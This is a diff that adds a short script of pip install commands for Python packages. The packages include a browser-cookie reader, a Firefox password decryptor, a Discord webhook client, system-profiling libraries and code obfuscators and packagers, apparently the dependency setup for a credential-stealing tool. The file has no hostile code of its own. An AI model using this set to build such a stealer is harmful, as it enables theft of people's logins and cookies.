@@ -1,0 +1,19 @@
+pip install --upgrade pip
+pip install browser_cookie3
+pip install cryptography
+pip install discord_webhook
+pip install ffpass
+pip install GPUtil
+pip install opencv_python
+pip install Pillow
+pip install psutil
+pip install pyasn1
+pip install pycryptodome
+pip install pywin32
+pip install pyzipper
+pip install Requests
+pip install WMI
+pip install xmpppy
+pip install nuitka
+pip install pyarmor
+pip install pyinstaller
